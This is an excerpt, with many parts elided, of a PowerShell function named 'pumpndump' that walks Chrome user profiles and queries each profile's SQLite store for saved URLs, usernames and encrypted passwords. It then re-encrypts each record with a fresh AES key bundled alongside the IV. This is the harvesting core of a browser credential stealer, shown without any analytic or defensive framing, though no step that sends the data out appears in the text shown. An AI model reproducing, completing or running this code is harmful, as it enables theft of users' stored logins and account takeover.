function pumpndump
{
    ...
    # Function to generate AES key and encrypt data with keyIVEncodeddata format
    function Encrypt-AES {
        ...
        # Combine key, IV, and encrypted data into keyIVEncodeddata format
        $combined = $aes.Key + $aes.IV + $encrypted
...
"@
        ...
        foreach ($user_profile in $chrome_profiles)
        {
            ...
            while([WinSQLite3]::Step($stmt) -eq 100) 
            {
                ...
                # Generate AES key for this data set
                $aesKey = [System.Security.Cryptography.Aes]::Create().Key
                
                # Encrypt data with AES in keyIVEncodeddata format
                $encryptedUrl = Encrypt-AES -Data $url -Key $aesKey
                $encryptedUsername = Encrypt-AES -Data $username -Key $aesKey
                $encryptedPasswordData = Encrypt-AES -Data $encryptedPassword -Key $aesKey
